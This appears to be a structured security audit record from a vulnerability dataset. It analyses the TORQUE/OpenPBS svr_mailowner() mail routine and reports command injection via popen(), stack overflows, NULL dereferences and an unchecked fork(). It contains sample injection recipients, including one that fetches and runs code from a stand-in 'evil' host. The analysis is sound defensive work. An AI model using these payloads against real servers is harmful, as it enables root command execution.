subsystem: svr_mailowner() from the TORQUE / OpenPBS (Portable Batch System) resource-manager server (pbs_server). It is the routine that notifies a job's owner by e-mail on job lifecycle events (abort/begin/end). It assembles a recipient address and a sendmail command line and then forks a child that pipes an RFC-822 message into the local mail transfer agent via popen().
provenance: Identified from the function name svr_mailowner and its parameter/attribute vocabulary: job *pjob, JOB_ATR_mailpnts/JOB_ATR_mailuser/JOB_ATR_euser/JOB_ATR_job_owner, server.sv_attr[SRV_ATR_MailDomain/SRV_ATR_mailfrom/SRV_ATR_MailSubjectFmt], MAIL_FORCE/MAIL_NONE/MAIL_ABORT, log_event(PBSEVENT_*), rpp_terminate()/net_close(), svr_format_job(), SENDMAIL_CMD and PBS_DEFAULT_MAIL. These are the TORQUE/PBS server API. The sample banner is corpus/train/train_0125_cwe94.c and the header comment reads 'sample: primevul_c_train_2308_vuln'.
trust_boundary: This runs inside the privileged pbs_server (typically root). The data folded into the e-mail recipient and into the shell command line originates from job submission by remote/unprivileged clients: the job owner string (JOB_ATR_job_owner / JOB_ATR_euser) and the user-supplied mail-recipient list (JOB_ATR_mailuser, set by `qsub -M ...`). These are attacker-influenced. server.sv_attr[SRV_ATR_MailDomain]/mailfrom are administrator-set and less hostile, but the owner and mailuser values cross the trust boundary from client to a root-context popen()/shell invocation.

what_the_code_does.explanation: The entry point takes a job handle pjob, a single-character mailpoint code (passed as int), a force flag, and optional free-text. The locals of interest are two FIXED-size 1024-byte stack buffers: mailto[1024], which will hold the assembled recipient list, and bodyfmtbuf[1024], which backs the default body-format template. cmdbuf is a heap pointer that will hold the sendmail shell command, mailfrom is an unbounded pointer to the sender address, and pas points at an array_strings structure holding the user-specified mail recipient list. Note that both 1024-byte buffers are fixed and will be filled from external strings later.

A global kill-switch: if the server's mail_domain attribute is the literal string 'never', the routine logs and returns without sending. The condition correctly guards the at_str dereference by first checking ATR_VFLAG_SET and a non-NULL pointer before calling strcasecmp. This is administrator policy, not attacker input.

A debug log at LOGLEVEL>=3. It renders the mailpoint character, job id, job_owner, and optional text into a LOG_BUF_SIZE stack buffer using snprintf with an explicit bound and a %.64s field-width cap on text, so this logging path is size-safe. It does, however, dereference pjob->ji_wattr[JOB_ATR_job_owner].at_val.at_str with no NULL check on the string pointer.

Delivery-policy filtering. Unless force==MAIL_FORCE (and the server's no_mail_force attribute is not TRUE), it inspects the job's mail-points string: if the first character is MAIL_NONE it returns; otherwise it uses strchr to check whether the current mailpoint character is one the user requested, returning if not. If the job set no mail-points attribute, mail is only sent for MAIL_ABORT. Note the mailpnts string pointer is dereferenced/read (line 64 dereferences *at_str, line 74 passes it to strchr) without a NULL check on at_val.at_str.

The server forks so the (potentially slow) mail delivery does not block. The parent (non-zero return) returns immediately; the child continues. The child tears down the RPP transport and closes network descriptors before doing any mail work. The fork() return value is used only as a boolean and is never compared to -1.

Determines the envelope-from address: it uses the server mailfrom attribute if set, otherwise falls back to the compile-time PBS_DEFAULT_MAIL. mailfrom ends up as a non-NULL pointer either way, so later strlen(mailfrom) is safe on that count. (The LOGLEVEL>=5 branch logs mailto before it has been populated, but that is only a cosmetic logging quirk.)

If the job carries a user-supplied recipient list (qsub -M), mailto is initialized empty and each list entry is appended, space-separated. Crucially THIS path is length-checked: before each strcat it verifies strlen(mailto)+strlen(entry)+2 < sizeof(mailto), so the 1024-byte buffer is respected here even though the entries are attacker-controlled. The concatenated content, however, is fully attacker-controlled string data that will later be handed to the shell.

When there is no user mail-list, mailto is built from the job owner. If a MailDomain is configured, it does strcpy(mailto, euser) then strcat '@' then strcat(MailDomain); otherwise (no TMAILDOMAIN compile option) it does strcpy(mailto, job_owner). UNLIKE the mailuser path above, NONE of these copies is length-checked against sizeof(mailto)==1024: euser and job_owner are strings derived from client job submission, and MailDomain from server config. This is the classic unbounded strcpy/strcat into a fixed stack buffer. The at_val.at_str pointers are also dereferenced with no NULL guard.

Chooses the subject and body format templates. If the admin set MailSubjectFmt/MailBodyFmt attributes, those pointers are used directly. Otherwise a default body template is assembled in bodyfmtbuf[1024] via strcpy of a literal and successive strcat of further short string LITERALS (%h, %m, %d lines). Because every appended string here is a compile-time literal of small, bounded length, this construction cannot overflow bodyfmtbuf. These format strings are later expanded by svr_format_job (a PBS-specific %-substitution, not printf), so the %i/%j/%h/%m/%d tokens are safe here.

Sizes and allocates the command buffer. The size is strlen(SENDMAIL_CMD)+strlen(mailfrom)+strlen(mailto)+6 bytes, which exactly covers the later format "%s -f %s %s": command + ' ' + '-f' + ' ' + from + ' ' + to + NUL = the three lengths plus 6, so the malloc size matches the sprintf output. The NULL-check branch logs and exit(1)s; note it prints cmdbuf, which is NULL when malloc failed (%s of NULL is UB/implementation-defined but only reached on allocation failure).

The sendmail command line is formatted into cmdbuf and then executed with popen(cmdbuf, "w"), which runs the string through /bin/sh -c and returns a write pipe. mailto (and mailfrom) are interpolated into that shell command line with no quoting or metacharacter sanitization. Since mailto is built from the client-supplied recipient list / job-owner name, any shell metacharacter it contains is interpreted by the shell. This is the sink the whole function feeds.

Writes the RFC-822 headers (To:, Subject:, Precedence:) and the body into the pipe. svr_format_job performs the PBS %-token substitution of subjectfmt/bodyfmt against pjob, mailpoint and text. The To: header echoes mailto verbatim; if an admin-controlled MailBodyFmt/subjectfmt was chosen it is expanded by the PBS formatter (not printf), so this is not a printf format-string bug.

Closes the pipe, waits for the sendmail child, and logs success/failure using the WIF*/W*STATUS macros through a bounded snprintf. The child then exit(0)s (the NOTREACHED return is dead code). This tail is size-safe; it is only reached after the popen() sink has already run.

what_could_go_wrong.explanation: OS command injection. cmdbuf is passed to popen(), which executes it via /bin/sh -c. mailto is interpolated into that command line and is derived from attacker-controlled data: the user mail-recipient list (JOB_ATR_mailuser, `qsub -M`) concatenated at lines 152-153, or the job owner / euser at lines 165/189. None of it is shell-quoted or filtered. A recipient such as `foo@x; touch /tmp/pwned` or `` `id` `` causes the shell to execute the injected command as the pbs_server user (commonly root). Because svr_mailowner runs unprivileged clients' submission data through a root shell, this is a remote privileged command-injection primitive. The invariant: external strings must NEVER be concatenated into a shell command line — use execve/posix_spawn with an argv array (sendmail argv, addresses as separate args) or rigorously validate addresses against an allowlist before use.

Unbounded stack buffer overflow of mailto[1024]. strcpy copies euser then strcat appends '@' and the mail domain, with no check that the combined length fits in the 1024-byte buffer — in stark contrast to the length-guarded mailuser path at line 150. euser comes from the job's submission and can be long; MailDomain is admin-set. If strlen(euser)+1+strlen(MailDomain) >= 1024 the copy writes past mailto, smashing the stack frame (return address, saved registers) of a process that is often root. Impact ranges from crash to code execution. Invariant: bound every copy by sizeof(mailto), e.g. snprintf(mailto, sizeof(mailto), "%s@%s", euser, domain).

Second unbounded overflow of mailto[1024]. In the default (no MailDomain) build, strcpy(mailto, job_owner) copies the job-owner string — a client-supplied `user@host` value — into the fixed 1024-byte buffer with no length check; the #ifdef TMAILDOMAIN variant likewise strcpy/strcat euser and a compile-time domain unbounded. A crafted, over-long job owner overflows the stack buffer with the same crash-to-RCE consequences as the MailDomain path. Same invariant: use a size-bounded formatter/copy.

NULL-pointer dereference. The owner-based branches read pjob->ji_wattr[JOB_ATR_euser].at_val.at_str (lines 165, 185) and JOB_ATR_job_owner.at_val.at_str (line 189) without checking that at_val.at_str is non-NULL — unlike the MailDomain guard at lines 162-163 which does test the string pointer. If the corresponding attribute is flagged set but its string pointer is NULL (or the attribute was never populated), strcpy dereferences NULL and the child crashes. Same for the mailpnts reads at lines 64/74. Invariant: verify at_val.at_str != NULL before every string use.

Unchecked fork() return. fork() returns -1 on failure (e.g. process/table exhaustion), and -1 is truthy, so the parent-path `return` executes and no mail is sent — a silent failure rather than a security breach, but the -1 case is indistinguishable from the real parent. More importantly, if fork ever returned 0 unexpectedly under resource pressure the child code runs; here the practical risk is denial of the notification, not memory safety. Invariant: compare fork() explicitly to -1 (error), 0 (child), else parent.

summary: Critical, remotely reachable OS command injection: svr_mailowner builds a sendmail command line by string-concatenating an attacker-influenced e-mail recipient (job owner / qsub -M mail list) and hands it to popen(), which runs it via /bin/sh in the (typically root) pbs_server child. The same recipient is also copied into a fixed 1024-byte stack buffer (mailto) through unbounded strcpy/strcat on the owner/domain paths, giving a second stack-overflow primitive. Attacker-controlled attribute strings are additionally dereferenced without NULL checks.

reviewed_anchors.anchor: svr_mailowner(job *pjob, int mailpoint, int force, char *text) signature (lines 2-7)
reviewed_anchors.reason: Entry signature; risk is realized in the body via pjob-derived strings and text, covered by the findings below.
Fixed-size stack buffer filled by unbounded strcpy/strcat on the owner/domain paths -> overflow.
Only ever filled from compile-time string literals (lines 228-239); bounded, cannot overflow.
Holds the shell command; sized correctly but its content flows into popen() -> command injection.
Set from server attr or PBS_DEFAULT_MAIL, always non-NULL; admin-controlled, low hostility; still interpolated into the command line but the dominant injection vector is mailto.

reviewed_anchors.anchor: mailuser list append loop with length check (lines 148-155)
reviewed_anchors.reason: This concatenation IS length-guarded (line 150 checks against sizeof(mailto)); no overflow here, though its output later reaches popen().
Unbounded copy of client-derived euser into mailto[1024]; stack overflow.

reviewed_anchors.anchor: strcpy/strcat mailto under TMAILDOMAIN / strcpy job_owner (lines 185-190)
reviewed_anchors.reason: Unbounded copy of client-derived job_owner/euser into mailto[1024]; stack overflow.
String pointers used without a NULL guard; possible NULL-deref crash.
All appended strings are short compile-time literals; no untrusted length involved.
Size exactly matches the later sprintf format "%s -f %s %s"; no under-allocation. Theoretical size_t overflow needs multi-GB strings, not reachable before the earlier stack overflow.
Buffer is exactly sized for this output; the real defect is the popen() sink it feeds, reported separately.
Executes an attacker-influenced string through /bin/sh -> OS command injection.
-1 error return not distinguished; silent notification failure.
PBS %-token formatter, not printf; format strings are literals/admin-set and not user %-format specifiers.
All use snprintf with sizeof-bounded destinations and fixed format strings; size-safe.
Correctly guards ATR_VFLAG_SET and non-NULL before strcasecmp; admin policy, no attacker input.

findings.title: OS command injection: attacker-controlled recipient reaches popen()/shell
findings.anchor: outmail = (FILE *)popen(cmdbuf, "w"); with cmdbuf built by sprintf from mailto/mailfrom
findings.bug_class: OS command injection via shell (popen with concatenated untrusted input)
findings.invariant: External recipient/sender strings must never be concatenated into a /bin/sh command line; invoke the MTA via execve/posix_spawn with an argv array (addresses as distinct argv elements), or strictly validate each address against a safe allowlist before use.
findings.failure_mode: mailto is assembled from client-controlled data (the qsub -M mail-user list at lines 152-153, or the job owner/euser at lines 165/189) with no shell-metacharacter sanitization, then interpolated into cmdbuf and executed by popen() through /bin/sh -c. A recipient like 'a@b; wget http://evil/x -O- | sh' or 'a@b `id`' executes arbitrary commands as the pbs_server user (commonly root), giving unprivileged job submitters remote command execution on the server.
findings.what_to_confirm: Confirm SENDMAIL_CMD/popen is the only exec path and that no upstream layer sanitizes JOB_ATR_mailuser/JOB_ATR_euser/JOB_ATR_job_owner; verify whether a fixed version switched to an argv-based exec (e.g. sendmail with -- and address args).

findings.title: Stack buffer overflow of mailto[1024] via unbounded strcpy/strcat (owner/domain path)
findings.anchor: strcpy(mailto, euser); strcat(mailto, "@"); strcat(mailto, MailDomain); and strcpy(mailto, job_owner)
findings.bug_class: Stack buffer overflow (buffer copy without size check)
findings.invariant: Every write into mailto must be bounded by sizeof(mailto)==1024 (snprintf/strlcpy), as the mailuser path already does at line 150; the owner/domain paths must not use raw strcpy/strcat.
findings.failure_mode: On the no-mail-list branch, euser+'@'+MailDomain (lines 165-167) or job_owner (line 189) are copied into the 1024-byte stack buffer with no length check. A client submitting an over-long owner/euser (or an over-long configured MailDomain) makes strlen exceed 1024, overflowing mailto and corrupting the stack frame of the (often root) child process — crash or potential code execution. Note the parallel mailuser path at line 150 IS guarded, highlighting the omission here.
findings.what_to_confirm: Determine the maximum enforced length of job_owner/euser (PBS_MAXUSER + host) and MailDomain upstream; if any can exceed ~1023 bytes the overflow is reachable. Confirm no intervening truncation.

findings.title: NULL-pointer dereference of attribute string pointers
findings.invariant: Verify at_val.at_str != NULL before passing it to strcpy/strcat/strchr; a set ATR_VFLAG_SET flag does not guarantee a non-NULL string pointer.
findings.failure_mode: The owner branches (lines 165, 185, 189) and the mailpnts reads (lines 64, 74) dereference at_val.at_str with no NULL guard, unlike the MailDomain check at lines 162-163. If the attribute is flagged set but its string pointer is NULL, strcpy/strchr dereference NULL and the child process crashes (denial of the notification). Not a memory-corruption escalation on its own, but an availability defect.
findings.what_to_confirm: Check whether the attribute layer guarantees a non-NULL at_str whenever ATR_VFLAG_SET is present for euser/job_owner/mailpnts; if not, the crash is reachable.

findings.title: Unchecked fork() return value
findings.bug_class: Unchecked return value / improper error handling
findings.invariant: fork() must be tested for the three outcomes: -1 (error, handle/log), 0 (child), >0 (parent); -1 must not be treated as the parent branch.
findings.failure_mode: fork() returning -1 (resource exhaustion) is truthy, so the parent-path 'return' runs and the mail is silently dropped with no error logged, making delivery failures invisible under load. This is a reliability/observability defect rather than a memory-safety issue.
findings.what_to_confirm: Confirm there is no caller-side handling of a failed notification and decide whether a -1 fork should be logged.

audit_checklist: Trace whether JOB_ATR_mailuser (qsub -M), JOB_ATR_euser and JOB_ATR_job_owner are ever sanitized for shell metacharacters before reaching popen() at line 269 — this is the critical command-injection question.
Confirm the maximum length of euser/job_owner (user+host) and the configured MailDomain; any value able to exceed 1023 bytes overflows mailto[1024] at lines 165-167 / 189.
Verify whether a fixed release replaced popen(sprintf(...)) with an argv-based exec (execve/posix_spawn) of the MTA with addresses as separate arguments.
Check that at_val.at_str is guaranteed non-NULL whenever ATR_VFLAG_SET is set for the attributes dereferenced at lines 64, 74, 165, 185, 189.
Confirm svr_format_job treats subjectfmt/bodyfmt as PBS %-tokens (not printf) so an admin-set MailBodyFmt/MailSubjectFmt cannot become a format-string bug.
Review privilege of the pbs_server process at the popen() site; if root, the injection is a full privilege-escalation-to-RCE path for unprivileged submitters.
